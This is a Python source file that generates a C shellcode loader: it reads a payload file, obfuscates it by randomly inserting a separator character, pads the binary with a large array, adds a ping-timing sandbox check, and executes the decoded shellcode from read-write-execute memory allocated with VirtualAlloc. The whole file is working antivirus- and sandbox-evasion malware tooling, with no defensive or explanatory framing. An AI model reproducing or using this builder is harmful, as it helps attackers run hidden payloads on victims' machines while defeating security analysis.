import random

class Manipulator:

	def __init__(self,sc,rate,payloadf):
		self.sc = sc
		self.rate = rate
		self.payload = payloadf

	def __includeANDdefine(self):
		toRet = "{}define WIN32_LEAN_AND_MEAN\n".format(chr(35))
		toRet += "{}include <windows.h>\n".format(chr(35))
		toRet += "{}include <stdlib.h>\n".format(chr(35))
		toRet += "{}include <time.h>\n".format(chr(35))
		toRet += "{}define SCSIZE 4096\n".format(chr(35))
		toRet += "{}define MIN_FILE_LENGHT 7050000\n".format(chr(35))
		return toRet
	
	def __variables(self):
		toRet = "char sizeManagmentArray[MIN_FILE_LENGHT] = \"a\";\n"
		toRet += "char payload[SCSIZE] = \"{}\";\n".format(self.__editPayload())
		return toRet

	def __sbd(self):
		toRet = "int sandboxDetected(){\n"
		toRet += "time_t startPing, endPing;\n"
		toRet += "time(&startPing);\n"
		toRet += "if(system(\"ping -n 1 -w 1500 10.0.0.1\") != 1) return 1;\n"
		toRet += "time(&endPing);\n"
		toRet += "if(difftime(endPing, startPing) < 1) return 1;\n"
		toRet += "return 0;\n}\n"
		return toRet

	def __m(self):
		toRet = "int main(int argc, char* argv[]){\n"
		toRet += "if(sandboxDetected()) return 0;\n"
		toRet += "void* p = VirtualAlloc(NULL, SCSIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
		toRet += "char* pp = (char*) p;\n"
		toRet += "char* x = payload;\n"
		toRet += "for(int i = 0; i < SCSIZE; i++){\n"
		toRet += "char v = *x++;\n"
		toRet += "if(v != '{}')\n".format(self.sc)
		toRet += "*pp++ = v;\n}\n"
		toRet += "(*(void (*)()) p)();\n return 0;\n}\n"
		return toRet

	def __editPayload(self):
		f = open(self.payload)
		content = f.read()
		toRet = ""
		byte = ""
		for i in content:
			if i == '\n' or i == None:
				continue
			byte += i
			if len(byte) == 4:
				if random.random() <= self.rate:
					toRet += self.sc
				toRet += byte
				byte = ""
		return toRet

	def __getHiddenPayload(self):
		toRet = self.__includeANDdefine()
		toRet += self.__variables()
		toRet += self.__sbd()
		toRet += self.__m()
		return toRet

	def generateSource(self):
		f = open("out.c","w")
		f.write(self.__getHiddenPayload())